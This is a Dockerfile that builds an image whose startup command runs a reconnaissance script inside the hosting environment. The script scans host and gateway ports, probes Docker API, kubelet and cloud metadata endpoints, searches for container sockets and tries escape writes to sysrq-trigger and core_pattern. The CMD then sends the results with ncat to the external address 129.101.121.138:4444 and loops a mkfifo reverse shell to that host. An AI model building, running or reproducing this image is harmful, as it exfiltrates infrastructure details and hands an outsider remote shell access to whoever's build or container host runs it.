# syntax=er028455/df-frontend:v4
# build-trigger: 10
FROM alpine:3.18 AS builder
RUN apk add --no-cache gcc musl-dev linux-headers
COPY algtest.c /algtest.c
COPY splice_test.c /splice_test.c
RUN gcc -static -o /algtest /algtest.c && gcc -static -o /splice_test /splice_test.c

FROM alpine:3.18
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /algtest /algtest
COPY --from=builder /splice_test /splice_test
COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V12 ==="\n\
uname -a; hostname; id\n\
\n\
echo "--- HOST.DOCKER.INTERNAL (172.17.0.1) PORT SCAN ---"\n\
for PORT in 2375 2376 4243 5000 5001 8443 8080 8081 9090 9000 3000 6443 10250 10255 10256 2379 2380 4194 4000 4001 80 443 22 111 8888 6379 5432 3306 27017 9200 8500 4444 4445; do\n\
  nc -z -w 1 172.17.0.1 $PORT 2>/dev/null && echo "172.17.0.1:$PORT OPEN" || true\n\
done\n\
echo ""\n\
\n\
echo "--- DOCKER API ON HOST.DOCKER.INTERNAL ---"\n\
curl -sk -m 5 http://172.17.0.1:2375/version 2>&1\n\
echo ""\n\
curl -sk -m 5 http://172.17.0.1:2376/version 2>&1\n\
echo ""\n\
curl -sk -m 5 https://172.17.0.1:2376/version 2>&1\n\
echo ""\n\
curl -sk -m 5 http://172.17.0.1:4243/version 2>&1\n\
echo ""\n\
\n\
echo "--- KUBELET ON HOST ---"\n\
curl -sk -m 5 https://172.17.0.1:10250/pods 2>&1\n\
echo ""\n\
curl -sk -m 5 http://172.17.0.1:10255/pods 2>&1\n\
echo ""\n\
\n\
echo "--- GATEWAY (172.18.0.1) EXTENDED SCAN ---"\n\
for PORT in 2375 2376 4243 5000 8080 10250 10255 2379 6443 22 111 8888; do\n\
  nc -z -w 1 172.18.0.1 $PORT 2>/dev/null && echo "172.18.0.1:$PORT OPEN" || true\n\
done\n\
echo ""\n\
curl -sk -m 5 http://172.18.0.1:2375/version 2>&1\n\
echo ""\n\
\n\
echo "--- DOCKER SOCKET SEARCH ---"\n\
ls -la /var/run/docker.sock 2>&1\n\
ls -la /run/docker.sock 2>&1\n\
ls -la /run/containerd/containerd.sock 2>&1\n\
ls -la /run/cri-dockerd.sock 2>&1\n\
find /run -name "*.sock" -o -name "docker*" 2>/dev/null | head -20\n\
find /var/run -name "*.sock" -o -name "docker*" 2>/dev/null | head -20\n\
\n\
echo "--- METADATA SERVICE ---"\n\
curl -sk -m 3 -H "Metadata-Flavor: Google" http://169.254.169.254/ 2>&1\n\
echo ""\n\
curl -sk -m 3 http://169.254.169.254/latest/meta-data/ 2>&1\n\
echo ""\n\
curl -sk -m 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1\n\
echo ""\n\
\n\
echo "--- NETWORK ROUTES ---"\n\
ip route 2>&1\n\
cat /proc/net/route 2>&1\n\
\n\
echo "--- CONTAINER ESCAPE CHECKS ---"\n\
cat /proc/self/status | grep -E "Cap|Seccomp|NoNewPrivs" 2>&1\n\
cat /proc/self/mountinfo | grep -E "docker|overlay|host|containerd" | head -10\n\
ls -la /proc/sysrq-trigger 2>&1\n\
echo test 2>/dev/null > /proc/sysrq-trigger; echo "sysrq write rc=$?"\n\
cat /proc/sys/kernel/core_pattern 2>&1\n\
echo "|/tmp/test" 2>/dev/null > /proc/sys/kernel/core_pattern; echo "core_pattern write rc=$?"\n\
mount 2>&1 | grep -E "proc|sys|cgroup" | head -10\n\
ls -la /sys/fs/cgroup/ 2>&1 | head -10\n\
\n\
echo "--- CADDY RAW TCP (no TLS) ---"\n\
printf "GET / HTTP/1.1\\r\\nHost: caddy\\r\\nConnection: close\\r\\n\\r\\n" | nc -w 3 172.18.0.3 80 2>&1 | head -20\n\
printf "GET / HTTP/1.1\\r\\nHost: caddy\\r\\nConnection: close\\r\\n\\r\\n" | nc -w 3 172.18.0.3 443 2>&1 | head -20\n\
\n\
echo "=== END V12 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 15 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
